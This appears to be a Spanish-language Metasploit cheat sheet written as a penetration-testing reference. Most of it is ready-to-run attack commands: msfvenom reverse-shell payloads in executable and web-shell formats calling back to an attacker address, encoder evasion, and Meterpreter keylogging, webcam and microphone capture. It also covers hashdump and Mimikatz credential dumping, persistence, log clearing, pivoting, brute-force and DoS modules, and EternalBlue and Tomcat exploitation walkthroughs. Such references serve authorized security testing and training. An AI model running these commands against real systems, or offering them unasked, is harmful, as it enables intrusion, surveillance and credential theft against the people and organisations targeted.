# Metasploit Framework

## ¿Qué es Metasploit?

Metasploit es el framework de pentesting más popular del mundo. Proporciona información sobre vulnerabilidades de seguridad y ayuda en tests de penetración y desarrollo de firmas IDS.

## Instalación

```bash
# Linux (Kali viene preinstalado)
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall
./msfinstall

# Actualizar
msfupdate
```

## Componentes Principales

### msfconsole
Interfaz principal de Metasploit.

```bash
msfconsole
```

### msfvenom
Generador de payloads (reemplaza msfpayload y msfencode).

```bash
msfvenom -p <payload> <options>
```

### msfdb
Gestión de la base de datos PostgreSQL.

```bash
# Iniciar BD
msfdb init

# Verificar estado
msfdb status
```

## Comandos Básicos

### Búsqueda
```bash
# Buscar exploits
search <término>
search type:exploit platform:windows
search cve:2021

# Ejemplos
search eternalblue
search tomcat
search wordpress

# Buscar por plataforma
search platform:linux type:exploit

# Buscar por rango de CVE
search cve:2021 type:exploit
```

### Usar Módulos
```bash
# Seleccionar módulo
use <módulo>
use exploit/windows/smb/ms17_010_eternalblue

# Ver información
info
info <módulo>

# Ver opciones
show options
show payloads
show targets
show advanced
show evasion

# Configurar opciones
set <OPCIÓN> <VALOR>
set RHOSTS 192.168.1.100
set RPORT 445
set LHOST 192.168.1.50
set LPORT 4444

# Configurar globalmente
setg LHOST 192.168.1.50

# Ver configuración actual
get <OPCIÓN>

# Volver atrás
back
```

### Ejecución
```bash
# Ejecutar exploit
exploit
run

# Ejecutar en background
exploit -j

# Verificar si vulnerable
check

# Ejecutar con opciones específicas
exploit RHOSTS=192.168.1.100 LHOST=192.168.1.50
```

## Payloads

### Tipos de Payloads

#### Singles
Payload autónomo completo.
```
windows/shell_bind_tcp
linux/x64/shell_reverse_tcp
```

#### Stagers
Payload pequeño que descarga el stage.
```
windows/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp
```

#### Stages
Payload completo descargado por el stager.
```
windows/meterpreter
linux/meterpreter
```

### Seleccionar Payload
```bash
# Dentro de un exploit
show payloads
set payload <payload>
set payload windows/meterpreter/reverse_tcp

# Opciones del payload
show options
```

## Meterpreter

### ¿Qué es Meterpreter?
Payload avanzado que proporciona una shell interactiva con capacidades extendidas.

### Comandos Básicos
```bash
# Sistema
sysinfo        # Información del sistema
getuid         # Usuario actual
getpid         # Process ID
ps             # Procesos en ejecución
shell          # Shell del sistema

# Navegación
pwd            # Directorio actual
cd <dir>       # Cambiar directorio
ls             # Listar archivos
cat <archivo>  # Ver archivo
```

### Gestión de Archivos
```bash
# Descargar
download C:\\archivo.txt /root/
download C:\\Users\\Admin\\Desktop\\*

# Subir
upload /root/tool.exe C:\\Windows\\Temp\\
upload -r /root/tools C:\\Windows\\Temp\\

# Buscar
search -f *.txt
search -d C:\\Users -f password.txt

# Editar
edit <archivo>
```

### Captura de Información
```bash
# Screenshot
screenshot

# Keylogger
keyscan_start
keyscan_dump
keyscan_stop

# Webcam
webcam_list
webcam_snap
webcam_stream

# Captura de audio
record_mic

# Idle time
idletime
```

### Privilege Escalation
```bash
# Obtener SYSTEM
getsystem

# Técnicas disponibles
getsystem -t 1  # Named Pipe Impersonation
getsystem -t 2  # Named Pipe Impersonation (Drop DLL)
getsystem -t 3  # Token Duplication
getsystem -t 4  # Named Pipe Impersonation (RPCSS)

# Migrar proceso
ps
migrate <PID>

# Verificar privilegios
getprivs
```

### Credential Harvesting
```bash
# Hashdump (requiere SYSTEM)
hashdump

# Mimikatz
load kiwi
kiwi_cmd sekurlsa::logonpasswords
kiwi_cmd lsadump::sam
creds_all

# LSA secrets
lsa_dump_secrets
```

### Persistence
```bash
# Persistence module
run persistence -h
run persistence -X -i 60 -p 4444 -r 192.168.1.50

# Autorun
# Scripts que se ejecutan automáticamente al inicio
```

### Pivoting
```bash
# Mostrar rutas
route

# Agregar ruta
route add 192.168.2.0 255.255.255.0 <session_id>

# Port forwarding
portfwd add -l 3389 -p 3389 -r 192.168.2.10
portfwd list
portfwd delete -l 3389

# Autoroute
run autoroute -s 192.168.2.0/24
run autoroute -p

# SOCKS proxy
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 4a
run -j

# Usar con proxychains
# Editar /etc/proxychains4.conf
# socks4 127.0.0.1 1080
proxychains nmap -sT 192.168.2.0/24
```

### Post-Explotación
```bash
# Enumeración
run post/windows/gather/enum_applications
run post/windows/gather/enum_logged_on_users
run post/linux/gather/enum_system
run post/multi/recon/local_exploit_suggester

# Clear logs
clearev

# Timestamp manipulation
timestomp
```

## MSFVenom - Generación de Payloads

### Sintaxis Básica
```bash
msfvenom -p <payload> <options> -f <format> -o <output>
```

### Windows Payloads

#### Reverse Shell
```bash
# EXE
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

# DLL
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f dll -o shell.dll

# MSI
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f msi -o shell.msi

# PowerShell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh -o shell.ps1
```

#### Bind Shell
```bash
msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe -o bind.exe
```

### Linux Payloads

```bash
# ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf

# Shell script
msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f sh -o shell.sh
```

### Web Payloads

```bash
# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp

# ASPX
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f aspx -o shell.aspx

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.jsp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o shell.war
```

### Encoded Payloads

```bash
# Listar encoders
msfvenom --list encoders

# Con encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -f exe -o encoded.exe

# Múltiples iteraciones
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded.exe
```

### Evitar Badchars

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -b '\x00\x0a\x0d' -f exe -o shell.exe
```

### Formatos de Output

```bash
# Ver todos los formatos
msfvenom --list formats

# Comunes
-f exe      # Windows executable
-f elf      # Linux executable
-f dll      # Windows DLL
-f raw      # Raw shellcode
-f python   # Python script
-f c        # C code
-f js       # JavaScript
-f vba      # VBA macro
```

## Listeners

### Multi/Handler

```bash
use exploit/multi/handler
set payload <mismo_payload_que_en_msfvenom>
set LHOST <tu_ip>
set LPORT <tu_puerto>
exploit -j  # Background

# Ejemplo
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j
```

## Gestión de Sesiones

```bash
# Listar sesiones
sessions

# Interactuar con sesión
sessions -i <id>

# Background actual session
background
Ctrl+Z

# Ejecutar comando en sesión
sessions -C "sysinfo" -i 1

# Ejecutar módulo en sesión
sessions -u <id>  # Upgrade a meterpreter

# Matar sesión
sessions -k <id>

# Matar todas
sessions -K
```

## Módulos Auxiliares

### Escaneo
```bash
# Port scan
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 80,443,445,3389
run

# SMB version
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# SSH version
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run
```

### Brute Force
```bash
# SSH
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# SMB
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.100
set SMBUser administrator
set PASS_FILE passwords.txt
run

# FTP
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.1.100
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

### Denial of Service
```bash
# SMB (solo para testing autorizado)
use auxiliary/dos/windows/smb/ms09_001_write
set RHOST 192.168.1.100
run
```

## Database

### Workspace
```bash
# Crear workspace
workspace -a pentest1

# Listar workspaces
workspace

# Cambiar workspace
workspace pentest1

# Eliminar workspace
workspace -d pentest1
```

### Datos
```bash
# Hosts
hosts
hosts -a 192.168.1.100
hosts -d 192.168.1.100  # Delete

# Servicios
services
services -p 80

# Loot (datos robados)
loot

# Credenciales
creds
creds -a  # Add

# Import nmap scan
db_import scan.xml

# Nmap desde msfconsole
db_nmap -sV 192.168.1.0/24
```

## Tips y Trucos

### Resource Scripts
```bash
# Crear script
echo "use exploit/multi/handler" > handler.rc
echo "set payload windows/meterpreter/reverse_tcp" >> handler.rc
echo "set LHOST 192.168.1.50" >> handler.rc
echo "set LPORT 4444" >> handler.rc
echo "exploit -j" >> handler.rc

# Ejecutar script
msfconsole -r handler.rc

# Desde msfconsole
resource handler.rc
```

### Logging
```bash
# Habilitar logging
spool /root/msf_log.txt

# Deshabilitar
spool off
```

### Configuración Global
```bash
# Ver configuración
show advanced

# Setear global
setg LHOST 192.168.1.50
setg ConsoleLogging true

# Guardar configuración
save
```

## Ejemplos Prácticos

### Exploit EternalBlue
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
check
exploit
```

### Exploit Tomcat
```bash
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 192.168.1.100
set RPORT 8080
set HttpUsername tomcat
set HttpPassword tomcat
set payload java/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit
```

### Post-Exploitation Automation
```bash
# Después de obtener meterpreter
run post/windows/gather/enum_applications
run post/windows/gather/enum_logged_on_users
run post/windows/gather/checkvm
run post/multi/recon/local_exploit_suggester
```

## Notas Importantes

> [!WARNING]
> **Advertencias:**
> - Algunos exploits pueden crashear servicios
> - Siempre ten autorización por escrito
> - Prueba en entorno controlado primero
> - `getsystem` puede ser detectado por AV

> [!TIP]
> **Best Practices:**
> - Usa workspaces para organizar proyectos
> - Habilita logging para documentación
> - Guarda resource scripts para tareas repetitivas
> - Verifica con `check` antes de `exploit`
> - Migra meterpreter a proceso estable

## Referencias

- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [Rapid7 Metasploit](https://www.metasploit.com/)
- [Metasploit Documentation](https://docs.metasploit.com/)
